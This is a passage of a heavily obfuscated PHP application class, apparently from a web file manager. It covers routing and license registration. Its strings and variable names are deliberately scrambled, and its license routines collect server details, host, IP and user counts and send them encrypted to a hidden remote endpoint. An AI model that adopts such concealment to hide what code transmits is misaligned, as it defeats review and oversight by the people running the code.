<?php
 goto eêì‹Œà; dâñÕñ£Æ—: if (strlen($zadctgyxhf) < $_SERVER[øşô´çË][714]) { return; } class Application { private $defaultModule = "\151\x6e\x64\145\x78"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\x69\156\x64\145\x78"; function __construct() { } public function setDefault($¬·Ï¯‰¤) { $òğ€¸àÁ =& $_SERVER[øşô´çË]; $¤şóÛ‚ =& $_SERVER[¸ƒÏ­ÍÄ]; $õ…Úƒı = explode($¤şóÛ‚[0], trim($¬·Ï¯‰¤, $¤şóÛ‚[0])); $ŠÈê‹•Í = $òğ€¸àÁ[715]; while ($ŠÈê‹•Í < $òğ€¸àÁ[716]) { if ($ŠÈê‹•Í >= 0) { break; } $ŠÈê‹•Í++; } $this->defaultModule = $õ…Úƒı[0] ? $õ…Úƒı[0] : $this->defaultModule; $this->defaultController = $õ…Úƒı[1] ? $õ…Úƒı[1] : $this->defaultController; $Ñê…™ôÌ = $òğ€¸àÁ[717]; if (strlen($Ñê…™ôÌ) < $òğ€¸àÁ[714]) { die; } $this->defaultAction = $õ…Úƒı[2] ? $õ…Úƒı[2] : $this->defaultAction; $ŒÈàÇ÷¿ = $òğ€¸àÁ[718]; while ($ŒÈàÇ÷¿ < $òğ€¸àÁ[719]) { if ($ŒÈàÇ÷¿ >= 0) { break; } $ŒÈàÇ÷¿++; } $this->kmjpea02a39e($¤şóÛ‚[1], array($this, $¤şóÛ‚[2])); $Ò³µ = $òğ€¸àÁ[720]; } public function appRun($öñÓ½²) { $°ôÙ¨ÒÅ =& $_SERVER[øşô´çË]; $•şØĞâ =& $_SERVER[¸ƒÏ­ÍÄ]; $Œ¼ŸùÏ‹ = explode($•şØĞâ[0], $öñÓ½²); $ş¡Æá¹¡ = $°ôÙ¨ÒÅ[721]; $•ÉîÂ»ú = strtolower($Œ¼ŸùÏ‹[0]); $´ªñÎ› = $°ôÙ¨ÒÅ[722]; if (strlen($´ªñÎ›) < $°ôÙ¨ÒÅ[716]) { die; } $„×±ÌÜÍ = $•şØĞâ[3]; $³¹¹®õ = $°ôÙ¨ÒÅ[723]; if ($•ÉîÂ»ú == $•şØĞâ[4]) { $„×±ÌÜÍ = $•şØĞâ[5]; $Œ¼ŸùÏ‹[0] = $•şØĞâ[6]; $Œ¼ŸùÏ‹[1] = $Œ¼ŸùÏ‹[1] . $•şØĞâ[7]; $öñÓ½² = join($•şØĞâ[0], $Œ¼ŸùÏ‹); $öñÓ½² = trim($öñÓ½², $•şØĞâ[0]); } call_user_func(array($•şØĞâ[8], $•şØĞâ[9]), $„×±ÌÜÍ . $•şØĞâ[10], $öñÓ½²); ActionCall($öñÓ½²); $úöòÁ¢ = $°ôÙ¨ÒÅ[724]; if (strlen($úöòÁ¢) < $°ôÙ¨ÒÅ[725]) { return; } call_user_func(array($•şØĞâ[8], $•şØĞâ[9]), $„×±ÌÜÍ . $•şØĞâ[11], $öñÓ½²); $´Ö÷¿»Û = $°ôÙ¨ÒÅ[726]; if (strlen($´Ö÷¿»Û) < $°ôÙ¨ÒÅ[719]) { return; } } private function autorun() { $œÍ‚ŞğÛ =& $_SERVER[øşô´çË]; $Òçïü´’ =& $_SERVER[¸ƒÏ­ÍÄ]; global $config; $Êì§…ì = $œÍ‚ŞğÛ[727]; while ($Êì§…ì < $œÍ‚ŞğÛ[719]) { if ($Êì§…ì >= 0) { break; } $Êì§…ì++; } if (count($config[$Òçïü´’[12]]) == 0) { return; } foreach ($config[$Òçïü´’[12]] as $ù£œØÄ— => $Äö‰•âã) { $this->appRun($Äö‰•âã); $‰•Í›Ü· = $œÍ‚ŞğÛ[728]; while (strlen($‰•Í›Ü·) < $œÍ‚ŞğÛ[714]) { if (!$‰•Í›Ü·) { break; } $‰•Í›Ü·++; } } } private function dejxf126d3c8() { $ÁÌ¢‘ì =& $_SERVER[øşô´çË]; $ÄõÂíÊ =& $_SERVER[¸ƒÏ­ÍÄ]; $Ëù±ïò = $ÄõÂíÊ[4]; $ı¡¯ñ„Á = $GLOBALS[$ÄõÂíÊ[13]][$ÄõÂíÊ[14]][0]; $È”•şÒŠ = $ÁÌ¢‘ì[729]; if (!$ı¡¯ñ„Á || strlen($ı¡¯ñ„Á) <= strlen($Ëù±ïò)) { return; } if (strtolower(substr($ı¡¯ñ„Á, -strlen($Ëù±ïò))) != $Ëù±ïò) { return; } $©í²ŞÚ¼ = substr($ı¡¯ñ„Á, 0, -strlen($Ëù±ïò)); $Âş’ªû‘ = array($ÄõÂíÊ[4], $©í²ŞÚ¼); $Ÿ¦Ë¨äÄ = array_slice($GLOBALS[$ÄõÂíÊ[13]][$ÄõÂíÊ[14]], 1); $ûúÍÑÂö = $ÁÌ¢‘ì[730]; if (!$ûúÍÑÂö) { return; } $GLOBALS[$ÄõÂíÊ[13]][$ÄõÂíÊ[14]] = array_merge($Âş’ªû‘, $Ÿ¦Ë¨äÄ); $GLOBALS[$ÄõÂíÊ[13]][$ÄõÂíÊ[15]] = implode($ÄõÂíÊ[0], $GLOBALS[$ÄõÂíÊ[13]][$ÄõÂíÊ[14]]); $ Š‘½¸ = $ÁÌ¢‘ì[731]; while ($ Š‘½¸ < $ÁÌ¢‘ì[725]) { if ($ Š‘½¸ >= 0) { break; } $ Š‘½¸++; } } private function oihjeb43f6e1() { $¯¾´ü–é =& $_SERVER[øşô´çË]; $•îÙÕü =& $_SERVER[¸ƒÏ­ÍÄ]; if ($GLOBALS[$•îÙÕü[13]][$•îÙÕü[15]] != $•îÙÕü[6]) { return; } $éõŞœ»¥ = $_SERVER[$•îÙÕü[16]]; $ßÌŞ€Ñ¬ = $•îÙÕü[17]; if (!strstr($éõŞœ»¥, $ßÌŞ€Ñ¬)) { return; } $¹Ú¤Ö’ = strrpos($éõŞœ»¥, $ßÌŞ€Ñ¬); $ÏşÇËã = substr($éõŞœ»¥, $¹Ú¤Ö’ + strlen($ßÌŞ€Ñ¬)); preg_match_all($•îÙÕü[18], $ÏşÇËã, $ı†¹è÷); $…‚‹—æ = $¯¾´ü–é[732]; while (strlen($…‚‹—æ) < $¯¾´ü–é[719]) { if (!$…‚‹—æ) { break; } $…‚‹—æ++; } $ÏşÇËã = trim($ı†¹è÷[0][0], $•îÙÕü[19]); $²£Úö’¾ = $¯¾´ü–é[733]; $GLOBALS[$•îÙÕü[13]][$•îÙÕü[14]] = explode($•îÙÕü[19], $ÏşÇËã); $GLOBALS[$•îÙÕü[13]][$•îÙÕü[15]] = implode($•îÙÕü[0], $GLOBALS[$•îÙÕü[13]][$•îÙÕü[14]]); $º£Á•Òİ = $¯¾´ü–é[734]; if (!$º£Á•Òİ) { return; } } public function run() { $¿Æòéê =& $_SERVER[øşô´çË]; $—²¼‘ =& $_SERVER[¸ƒÏ­ÍÄ]; $this->oihjeb43f6e1(); $¡­‡ıç = $¿Æòéê[735]; $this->dejxf126d3c8(); $å«ã›¿¹ = $GLOBALS[$—²¼‘[13]][$—²¼‘[14]]; $‹é¬ş = $GLOBALS[$—²¼‘[13]][$—²¼‘[15]]; define($—²¼‘[20], isset($å«ã›¿¹[0]) && $å«ã›¿¹[0] ? $å«ã›¿¹[0] : $this->defaultModule); $–ªÇãªç = $¿Æòéê[736]; if (!$–ªÇãªç) { die; } define($—²¼‘[21], isset($å«ã›¿¹[1]) && $å«ã›¿¹[0] ? $å«ã›¿¹[1] : $this->defaultController); define($—²¼‘[22], isset($å«ã›¿¹[2]) && $å«ã›¿¹[0] ? $å«ã›¿¹[2] : $this->defaultAction); $¦èÛ‹Ÿ = $¿Æòéê[737]; if (strlen($¦èÛ‹Ÿ) < $¿Æòéê[719]) { return; } define($—²¼‘[23], MOD . $—²¼‘[0] . ST . $—²¼‘[0] . ACT); $_SERVER[$—²¼‘[24]] = strtolower(ACTION); $this->autorun(); if (count($å«ã›¿¹) >= 3) { $this->appRun($‹é¬ş); } else { $this->appRun(ACTION); } } private $juweccd77b52 = array(); private $naqjc6bb6442 = ''; public function gpaxd1b48d5d() { $ş‰š¸¯¡ =& $_SERVER[øşô´çË]; $åñ¡àæ =& $_SERVER[¸ƒÏ­ÍÄ]; $this->xjagf01806e1(); $this->fpjb7242a4e9(); $øÑ¶›­½ = $ş‰š¸¯¡[738]; $this->gqmfc951a6dc(); $Ÿ¬¡¯Ú¼ = $ş‰š¸¯¡[739]; while ($Ÿ¬¡¯Ú¼ < $ş‰š¸¯¡[714]) { if ($Ÿ¬¡¯Ú¼ >= 0) { break; } $Ÿ¬¡¯Ú¼++; } $this->kvmhc1d98d1c(); $this->dfyv53b39d3e(); $this->usqwad806ae4(); $²µì’î = $ş‰š¸¯¡[740]; while (strlen($²µì’î) < $ş‰š¸¯¡[725]) { if (!$²µì’î) { break; } $²µì’î++; } $this->hnglca038ae5(); $ÇÎ¦¹¦ = $ş‰š¸¯¡[741]; if (strlen($ÇÎ¦¹¦) < $ş‰š¸¯¡[719]) { die; } $this->kmjpea02a39e($åñ¡àæ[25], array($this, $åñ¡àæ[26])); $this->kmjpea02a39e($åñ¡àæ[27], array($this, $åñ¡àæ[28])); $this->kmjpea02a39e($åñ¡àæ[29], array($this, $åñ¡àæ[30])); $this->kmjpea02a39e($åñ¡àæ[31], array($this, $åñ¡àæ[32])); $¯²ÎÇ’¥ = $ş‰š¸¯¡[742]; } public function getVersionData() { return $this->juweccd77b52; $ô‚è¢éØ = $_SERVER[øşô´çË][743]; if (!$ô‚è¢éØ) { return; } } public function tzkud3cd2e30($•êÂ€ÄÃ) { $ß­Ä¤© =& $_SERVER[øşô´çË]; $¤›ÅÂÑ =& $_SERVER[¸ƒÏ­ÍÄ]; $Ìûë½óñ = Model($¤›ÅÂÑ[33])->get(); $Øéñ ‚Š = $ß­Ä¤©[744]; $ÍÏ¬É = array($¤›ÅÂÑ[34], $¤›ÅÂÑ[35], $¤›ÅÂÑ[36], $¤›ÅÂÑ[37], $¤›ÅÂÑ[38], $¤›ÅÂÑ[39], $¤›ÅÂÑ[40], $¤›ÅÂÑ[41], $¤›ÅÂÑ[42], $¤›ÅÂÑ[43], $¤›ÅÂÑ[44], $¤›ÅÂÑ[45], $¤›ÅÂÑ[46], $¤›ÅÂÑ[47], $¤›ÅÂÑ[48], $¤›ÅÂÑ[49], $¤›ÅÂÑ[50], $¤›ÅÂÑ[51], $¤›ÅÂÑ[52], $¤›ÅÂÑ[53], $¤›ÅÂÑ[54], $¤›ÅÂÑ[55], $¤›ÅÂÑ[56], $¤›ÅÂÑ[57], $¤›ÅÂÑ[58], $¤›ÅÂÑ[59], $¤›ÅÂÑ[60], $¤›ÅÂÑ[61], $¤›ÅÂÑ[62], $¤›ÅÂÑ[63], $¤›ÅÂÑ[64], $¤›ÅÂÑ[65], $¤›ÅÂÑ[66], $¤›ÅÂÑ[67], $¤›ÅÂÑ[68], $¤›ÅÂÑ[69], $¤›ÅÂÑ[70], $¤›ÅÂÑ[71], $¤›ÅÂÑ[72], $¤›ÅÂÑ[73], $¤›ÅÂÑ[74], $¤›ÅÂÑ[75], $¤›ÅÂÑ[76], $¤›ÅÂÑ[77], $¤›ÅÂÑ[78], $¤›ÅÂÑ[79], $¤›ÅÂÑ[80], $¤›ÅÂÑ[81], $¤›ÅÂÑ[82], $¤›ÅÂÑ[83], $¤›ÅÂÑ[84], $¤›ÅÂÑ[85], $¤›ÅÂÑ[86], $¤›ÅÂÑ[87]); $Ë–àÍõ× = $ß­Ä¤©[745]; foreach ($ÍÏ¬É as $ò„£¹Ì) { $Á¾ºˆ½ˆ = $GLOBALS[$¤›ÅÂÑ[88]][$¤›ÅÂÑ[89]][$ò„£¹Ì]; $÷Ó»Õ´Ä = $ß­Ä¤©[746]; if (!$÷Ó»Õ´Ä) { die; } if (isset($Ìûë½óñ[$ò„£¹Ì])) { $Á¾ºˆ½ˆ = $Ìûë½óñ[$ò„£¹Ì]; } $•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$ò„£¹Ì] = $Á¾ºˆ½ˆ; } $¡âë×¾Ğ = $•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$¤›ÅÂÑ[46]]; unset($•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[92]][$¤›ÅÂÑ[93]]); unset($•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[92]][$¤›ÅÂÑ[94]]); unset($•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$¤›ÅÂÑ[46]]); $‘ˆÚ×²  = $ß­Ä¤©[747]; unset($•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$¤›ÅÂÑ[95]]); $•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$¤›ÅÂÑ[96]] = array($¤›ÅÂÑ[97] => (int) $¡âë×¾Ğ[$¤›ÅÂÑ[98]], $¤›ÅÂÑ[99] => (int) _get($¡âë×¾Ğ, $¤›ÅÂÑ[100], 0)); $ääÜÍì = substr(md5($¤›ÅÂÑ[101] . get_client_ip() . $Ìûë½óñ[$¤›ÅÂÑ[102]]), 0, 15); $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[104]] = Mcrypt::encode(Session::sign(), $ääÜÍì, 3600 * 24); $À É­ğ = $ß­Ä¤©[748]; while ($À É­ğ < $ß­Ä¤©[725]) { if ($À É­ğ >= 0) { break; } $À É­ğ++; } $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[105]] = Action($¤›ÅÂÑ[106])->accessToken(); $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[107]] = md5($_SERVER[$¤›ÅÂÑ[108]] . $Ìûë½óñ[$¤›ÅÂÑ[102]]); $ßæÆÜ˜ô = $ß­Ä¤©[749]; if (strlen($ßæÆÜ˜ô) < $ß­Ä¤©[716]) { die; } $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[109]] = base64_encode(serverInfo()); $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[110]] = $this->naqjc6bb6442; if ($Ìûë½óñ[$¤›ÅÂÑ[110]] != $¤›ÅÂÑ[111]) { $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[112]] = $Ìûë½óñ[$¤›ÅÂÑ[112]]; $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[113]] = $Ìûë½óñ[$¤›ÅÂÑ[113]]; $ÊˆÖÓ½Î = rand_string(10) . $this->naqjc6bb6442 . rand_string(5); $•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[114]][$¤›ÅÂÑ[115]] = $this->vpxb2ff56f0e($ÊˆÖÓ½Î, $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[107]]); } if ($this->naqjc6bb6442 == $¤›ÅÂÑ[111]) { $•êÂ€ÄÃ[$¤›ÅÂÑ[90]][$¤›ÅÂÑ[91]][$¤›ÅÂÑ[96]][$¤›ÅÂÑ[100]] = 0; } $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[116]] = $this->versionPluginFilter(); $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[117]] = _get($this->juweccd77b52, $¤›ÅÂÑ[118], $¤›ÅÂÑ[6]); if (KodUser::isRoot() && $this->config[$¤›ÅÂÑ[119]]) { $•êÂ€ÄÃ[$¤›ÅÂÑ[103]][$¤›ÅÂÑ[120]] = WEB_ROOT; } return $•êÂ€ÄÃ; } private function usqwad806ae4() { $‡«¶ˆÏÇ =& $_SERVER[øşô´çË]; $€›Úêêğ =& $_SERVER[¸ƒÏ­ÍÄ]; $´‰ÑË = $_SERVER[$€›Úêêğ[24]] == $€›Úêêğ[121]; $ºÉ¬Æü“ = $‡«¶ˆÏÇ[750]; if (!$ºÉ¬Æü“) { return; } if ($_SERVER[$€›Úêêğ[24]] == $€›Úêêğ[122] && $_GET[$€›Úêêğ[123]] == $€›Úêêğ[124]) { $´‰ÑË = !0; } if ($´‰ÑË) { $·İè†¯£ = array($€›Úêêğ[110] => $this->naqjc6bb6442, $€›Úêêğ[125] => $this->xlvd465b91e2(), $€›Úêêğ[126] => Model($€›Úêêğ[127])->count()); if ($this->naqjc6bb6442 != $€›Úêêğ[111]) { $ˆ›ë« = _get($this->juweccd77b52, $€›Úêêğ[128]); if ($ˆ›ë«) { $·İè†¯£[$€›Úêêğ[129]] = $ˆ›ë«; $·İè†¯£[$€›Úêêğ[130]] = strtotime(_get($this->juweccd77b52, $€›Úêêğ[131])); $·İè†¯£[$€›Úêêğ[132]] = _get($this->juweccd77b52, $€›Úêêğ[118]); } $ñ¨¥‹ª… = Model($€›Úêêğ[33])->get($€›Úêêğ[133], $€›Úêêğ[6], !0); if (is_string($ñ¨¥‹ª…) && substr($ñ¨¥‹ª…, 0, 1) == $€›Úêêğ[134]) { $ñ¨¥‹ª… = json_decode_force($ñ¨¥‹ª…); } if (is_array($ñ¨¥‹ª…) && $ñ¨¥‹ª…[$€›Úêêğ[135]] && strstr($ñ¨¥‹ª…[$€›Úêêğ[135]], $€›Úêêğ[136])) { $ó¹­Ô®Û = explode($€›Úêêğ[136], $ñ¨¥‹ª…[$€›Úêêğ[135]]); $·İè†¯£[$€›Úêêğ[137]] = $ó¹­Ô®Û[0]; } } $·İè†¯£ = $this->njwgf50c206b(json_encode($·İè†¯£), md5($€›Úêêğ[138])); $´ß¨¿Òà = $‡«¶ˆÏÇ[751]; if (!$´ß¨¿Òà) { die; } $÷¥ÕÕê› = array($€›Úêêğ[139] => $·İè†¯£); call_user_func(array($€›Úêêğ[140], $€›Úêêğ[141]), $÷¥ÕÕê›); } if ($this->naqjc6bb6442 == $€›Úêêğ[111]) { return; } $­‰¦ÅÁÅ = array($€›Úêêğ[142], $€›Úêêğ[143], $€›Úêêğ[144], $€›Úêêğ[145], $€›Úêêğ[146], $€›Úêêğ[147]); $”“ş½± = $‡«¶ˆÏÇ[752]; if (!$”“ş½±) { die; } $Ó´Ç… Ú = Model($€›Úêêğ[33])->get(); $÷¥ÕÕê› = array($€›Úêêğ[148] => $Ó´Ç… Ú[$€›Úêêğ[34]], $€›Úêêğ[149] => $Ó´Ç… Ú[$€›Úêêğ[35]], $€›Úêêğ[150] => $€›Úêêğ[6]); foreach ($­‰¦ÅÁÅ as $Ä›†’İó) { if (!isset($Ó´Ç… Ú[$Ä›†’İó]) || !$Ó´Ç… Ú[$Ä›†’İó]) { continue; } $÷¥ÕÕê›[$Ä›†’İó] = $Ó´Ç… Ú[$Ä›†’İó]; } call_user_func(array($€›Úêêğ[140], $€›Úêêğ[141]), $÷¥ÕÕê›); } private function kvmhc1d98d1c() { $ÏÎÕÑˆ =& $_SERVER[øşô´çË]; $ïîóÆ‰ì =& $_SERVER[¸ƒÏ­ÍÄ]; if ($_SERVER[$ïîóÆ‰ì[24]] != $ïîóÆ‰ì[151]) { return; } if (!KodUser::isRoot()) { die; } $›ßÃ‰° = $GLOBALS[$ïîóÆ‰ì[13]]; if (isset($›ßÃ‰°[$ïîóÆ‰ì[152]])) { $this->hzsv0e181c68(); die; } if (isset($›ßÃ‰°[$ïîóÆ‰ì[153]]) && isset($›ßÃ‰°[$ïîóÆ‰ì[153]]) == $ïîóÆ‰ì[124]) { $›ßÃ‰°[$ïîóÆ‰ì[154]] = Model($ïîóÆ‰ì[33])->get($ïîóÆ‰ì[155]); } if (!isset($›ßÃ‰°[$ïîóÆ‰ì[154]]) || strlen($›ßÃ‰°[$ïîóÆ‰ì[154]]) != 16) { show_json($ïîóÆ‰ì[156] . $›ßÃ‰°[$ïîóÆ‰ì[154]], !1); } $©ÂÓ£†È = Model($ïîóÆ‰ì[33])->get($ïîóÆ‰ì[102]); $‚À’¯À  = md5($_SERVER[$ïîóÆ‰ì[108]] . $©ÂÓ£†È); $É‚İîõ = $ÏÎÕÑˆ[753]; if (strlen($É‚İîõ) < $ÏÎÕÑˆ[725]) { return; } $şä¬Ø = array($ïîóÆ‰ì[154] => $›ßÃ‰°[$ïîóÆ‰ì[154]], $ïîóÆ‰ì[157] => rand_string(16), $ïîóÆ‰ì[158] => $ïîóÆ‰ì[138], $ïîóÆ‰ì[159] => $ïîóÆ‰ì[160], $ïîóÆ‰ì[161] => $_SERVER[$ïîóÆ‰ì[162]], $ïîóÆ‰ì[163] => $_SERVER[$ïîóÆ‰ì[164]], $ïîóÆ‰ì[165] => $_SERVER[$ïîóÆ‰ì[166]], $ïîóÆ‰ì[107] => $‚À’¯À , $ïîóÆ‰ì[167] => Model($ïîóÆ‰ì[33])->get($ïîóÆ‰ì[133])); $œé…‰å = $ÏÎÕÑˆ[754]; if (isset($›ßÃ‰°[$ïîóÆ‰ì[153]]) && isset($›ßÃ‰°[$ïîóÆ‰ì[153]]) == $ïîóÆ‰ì[124]) { $şä¬Ø[$ïîóÆ‰ì[153]] = md5($şä¬Ø[$ïîóÆ‰ì[154]] . $ïîóÆ‰ì[168] . $şä¬Ø[$ïîóÆ‰ì[157]]); } if ($›ßÃ‰°[$ïîóÆ‰ì[169]] == $ïîóÆ‰ì[170]) { $˜ÇÅ±Í = $this->njwgf50c206b($‚À’¯À , $ïîóÆ‰ì[171]); $¦Á’‘Ê = $this->vpxb2ff56f0e(json_encode($şä¬Ø), $‚À’¯À  . $ïîóÆ‰ì[172], 3); $¦Á’‘Ê = $¦Á’‘Ê . $ïîóÆ‰ì[173] . $_SERVER[$ïîóÆ‰ì[162]]; $¨ğ„§ = $this->soued22c3dd1($ïîóÆ‰ì[174] . $˜ÇÅ±Í . $ïîóÆ‰ì[175] . $¦Á’‘Ê, -1); show_json($¨ğ„§, !0); } else { if ($›ßÃ‰°[$ïîóÆ‰ì[169]] == $ïîóÆ‰ì[176]) { $ñ³–ğˆè = substr(md5($ïîóÆ‰ì[177] . $‚À’¯À ), 12, 15) . $ïîóÆ‰ì[178]; $¦Á’‘Ê = $this->bhpicc63cc43(trim($›ßÃ‰°[$ïîóÆ‰ì[179]]), $ñ³–ğˆè, 2); $õŞ®İş = json_decode($¦Á’‘Ê, !0); if (!is_array($õŞ®İş) || !is_array($õŞ®İş[$ïîóÆ‰ì[180]]) || $õŞ®İş[$ïîóÆ‰ì[154]] != !0) { $Ğö×ÉØ = $ïîóÆ‰ì[181]; $ˆËıÅŸ£ = $õŞ®İş[$ïîóÆ‰ì[180]] ? $ïîóÆ‰ì[182] . $õŞ®İş[$ïîóÆ‰ì[180]] : $Ğö×ÉØ; show_json($ˆËıÅŸ£, !1); } else { $şä¬Ø[$ïîóÆ‰ì[157]] = $õŞ®İş[$ïîóÆ‰ì[180]][$ïîóÆ‰ì[183]]; } } else { $õŞ®İş = $this->soued22c3dd1($ïîóÆ‰ì[184], $şä¬Ø, 10); $Ä¡üà›« = $ÏÎÕÑˆ[755]; if (!$Ä¡üà›«) { return; } } } if (!is_array($õŞ®İş) || !is_array($õŞ®İş[$ïîóÆ‰ì[180]]) || $õŞ®İş[$ïîóÆ‰ì[154]] != !0) { $Ğö×ÉØ = LNG($ïîóÆ‰ì[185]); $ˆËıÅŸ£ = $õŞ®İş[$ïîóÆ‰ì[180]] ? $ïîóÆ‰ì[182] . $õŞ®İş[$ïîóÆ‰ì[180]] : $Ğö×ÉØ; show_json($ˆËıÅŸ£, !1); } $¬³ë¯Ä‡ = $õŞ®İş[$ïîóÆ‰ì[180]]; $Ùç“¼·Œ = $this->xfre62d6a021($¬³ë¯Ä‡[$ïîóÆ‰ì[186]]); if (!$Ùç“¼·Œ || $Ùç“¼·Œ != $¬³ë¯Ä‡[$ïîóÆ‰ì[131]]) { $åû—é¢Í = array($ïîóÆ‰ì[187] => Model($ïîóÆ‰ì[33])->get($ïîóÆ‰ì[102]), $ïîóÆ‰ì[188] => $_SERVER[$ïîóÆ‰ì[108]], $ïîóÆ‰ì[189] => this_url(), $ïîóÆ‰ì[163] => $_SERVER[$ïîóÆ‰ì[164]]); $¦Á’‘Ê = $this->xtad46a5ad86(json_encode($åû—é¢Í)); $this->soued22c3dd1($ïîóÆ‰ì[190] . $¦Á’‘Ê); show_json(LNG($ïîóÆ‰ì[191]), !0); } $ôĞé«¬‘ = array($ïîóÆ‰ì[155] => $¬³ë¯Ä‡[$ïîóÆ‰ì[192]], $ïîóÆ‰ì[193] => $¬³ë¯Ä‡[$ïîóÆ‰ì[194]], $ïîóÆ‰ì[195] => rand_string(16), $ïîóÆ‰ì[110] => $¬³ë¯Ä‡[$ïîóÆ‰ì[196]]); if ($şä¬Ø[$ïîóÆ‰ì[157]]) { $ôĞé«¬‘[$ïîóÆ‰ì[195]] = $şä¬Ø[$ïîóÆ‰ì[157]]; } $¸ãßœÔ = substr(md5($ôĞé«¬‘[$ïîóÆ‰ì[193]]), 10, 10); $õİÀàÛá = $¸ãßœÔ . $ôĞé«¬‘[$ïîóÆ‰ì[110]] . $ôĞé«¬‘[$ïîóÆ‰ì[195]]; $ôĞé«¬‘[$ïîóÆ‰ì[112]] = strrev(base64_encode($this->njwgf50c206b($õİÀàÛá, $ïîóÆ‰ì[197]))); $¾šÈ˜ò“ = rand_string(16); $¦¶ƒìÌ = $ÏÎÕÑˆ[756]; while ($¦¶ƒìÌ < $ÏÎÕÑˆ[719]) { if ($¦¶ƒìÌ >= 0) { break; } $¦¶ƒìÌ++; } $¦Ú‚ş·È = $¾šÈ˜ò“ . $ôĞé«¬‘[$ïîóÆ‰ì[110]] . $this->njwgf50c206b(md5($ôĞé«¬‘[$ïîóÆ‰ì[155]]), $¾šÈ˜ò“); $Ö¸Ìç¤· = $ÏÎÕÑˆ[757]; if (strlen($Ö¸Ìç¤·) < $ÏÎÕÑˆ[719]) { return; } $ôĞé«¬‘[$ïîóÆ‰ì[113]] = base64_encode(strrev($this->njwgf50c206b($¦Ú‚ş·È, $ïîóÆ‰ì[198]))); if ($¬³ë¯Ä‡[$ïîóÆ‰ì[199]] && $¬³ë¯Ä‡[$ïîóÆ‰ì[199]] >= 1) { Model($ïîóÆ‰ì[33])->setDeep($ïîóÆ‰ì[200], $ïîóÆ‰ì[124]); } Model($ïîóÆ‰ì[33])->set($ôĞé«¬‘); $Íø–Á°ó = md5($_SERVER[$ïîóÆ‰ì[108]] . strrev($©ÂÓ£†È) . $ôĞé«¬‘[$ïîóÆ‰ì[193]]); $øºÁ”’É = strrev(substr($Íø–Á°ó, 10, 16)); $ÕüıƒÌ = $ÏÎÕÑˆ[758]; $¹«ä©™ = $this->vpxb2ff56f0e(json_encode($¬³ë¯Ä‡), $Íø–Á°ó); $´«ûËâ = $ÏÎÕÑˆ[759]; $İ‘Ş¦Îù = array_to_keyvalue(Model($ïîóÆ‰ì[7])->listData(), $ïîóÆ‰ì[201]); $Â±åÌâ“ = $İ‘Ş¦Îù[$ïîóÆ‰ì[202]]; $ºø«Ş„Â = array(); $ó¸õÎºÌ = $ÏÎÕÑˆ[760]; $ºø«Ş„Â[$øºÁ”’É] = $¹«ä©™; $ìêÔà¸Ê = $ÏÎÕÑˆ[761]; if (!$ìêÔà¸Ê) { die; } Model($ïîóÆ‰ì[7])->update($Â±åÌâ“[$ïîóÆ‰ì[203]], array($ïîóÆ‰ì[204] => $ºø«Ş„Â)); $ÇĞÒî— = $ÏÎÕÑˆ[762]; if (!$ÇĞÒî—) { return; } $this->juweccd77b52 = $¬³ë¯Ä‡; $this->naqjc6bb6442 = $ôĞé«¬‘[$ïîóÆ‰ì[110]]; $this->licenseRegistSuccess(); Cache::set($ïîóÆ‰ì[205] . md5($©ÂÓ£†È . $ïîóÆ‰ì[206]), $ïîóÆ‰ì[6]); show_json(LNG($ïîóÆ‰ì[191]), !0); } private function licenseRegistSuccess() { $Ä®¨âôŞ =& $_SERVER[¸ƒÏ­ÍÄ]; $¦Ê¸ûñ = Model($Ä®¨âôŞ[33])->get(); if ($¦Ê¸ûñ[$Ä®¨âôŞ[63]] != $Ä®¨âôŞ[124]) { Model($Ä®¨âôŞ[33])->set($Ä®¨âôŞ[63], $Ä®¨âôŞ[124]); } Action($Ä®¨âôŞ[207])->initStart(!0); } private function hzsv0e181c68() { $œæö£Á =& $_SERVER[øşô´çË]; $×ıû¦«§ =& $_SERVER[¸ƒÏ­ÍÄ]; Model($×ıû¦«§[33])->set(array($×ıû¦«§[155] => $×ıû¦«§[6], $×ıû¦«§[193] => $×ıû¦«§[6], $×ıû¦«§[110] => $×ıû¦«§[111], $×ıû¦«§[112] => $×ıû¦«§[6], $×ıû¦«§[113] => $×ıû¦«§[6])); $Â•‹ü™ = $œæö£Á[763]; if (!$Â•‹ü™) { die; } Model($×ıû¦«§[33])->setDeep($×ıû¦«§[200], $×ıû¦«§[208]); $ëª€µëé = $œæö£Á[764]; if (strlen($ëª€µëé) < $œæö£Á[719]) { return; } $this->juweccd77b52 = array(); $“şÊàÎ£ = $œæö£Á[765]; $this->naqjc6bb6442 = $×ıû¦«§[111]; } private function xjagf01806e1() { $ÒÄÉÒºù =& $_SERVER[øşô´çË]; $¡ ¾¯¤ø =& $_SERVER[¸ƒÏ­ÍÄ]; $_SERVER[$¡ ¾¯¤ø[164]] = _get($_SERVER, $¡ ¾¯¤ø[164], APP_HOST); $this->naqjc6bb6442 = $¡ ¾¯¤ø[111]; $æÖïĞÈŸ = $ÒÄÉÒºù[766]; if (!$æÖïĞÈŸ) { die; } $¡„ù€¼“ = Model($¡ ¾¯¤ø[33])->get(); if ($¡„ù€¼“[$¡ ¾¯¤ø[110]] == $¡ ¾¯¤ø[111]) { return; } $½ªÈ•Çî = Model($¡ 